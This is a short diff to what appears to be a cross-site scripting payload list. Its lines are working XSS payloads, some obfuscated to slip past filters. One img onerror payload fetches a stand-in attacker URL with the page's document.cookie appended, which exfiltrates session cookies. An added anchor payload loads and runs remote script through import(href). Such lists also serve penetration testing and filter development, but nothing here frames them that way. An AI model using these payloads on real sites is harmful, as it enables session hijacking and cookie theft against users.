@@ -1,3 +1,5 @@
 <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
 </p><h1 onmouseover='confirm(5)'>xss</h1> 
 <Img Src=OnXSS OnErroR=confirm(document.cookie)>
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`>
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
